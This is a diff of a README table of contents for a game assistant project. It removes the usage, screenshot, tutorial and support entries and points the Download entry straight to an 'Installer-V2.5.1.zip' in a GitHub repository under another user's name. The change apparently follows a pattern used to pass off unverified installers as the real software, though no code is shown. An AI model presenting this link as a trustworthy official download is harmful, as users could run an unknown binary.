@@ -36,14 +36,9 @@
 - [RimAssistantCompany](#rimassistantcompany)
   - [Disclaimer](#disclaimer)
   - [Features](#features)
-  - [Download](#download)
-  - [How to Use](#how-to-use)
-  - [Screenshots](#screenshots)
-  - [Video Tutorials](#video-tutorials)
+  - [Download]((https://github.com/RatioRatPier/RimAssistantLimbusCompany/blob/main/Installer-V2.5.1.zip))
   - [Contributing](#contributing)
   - [Acknowledgements](#acknowledgements)
-  - [Related Projects](#related-projects)
-  - [Support](#support)
   - [Final Notes](#final-notes)
 
 ## Disclaimer
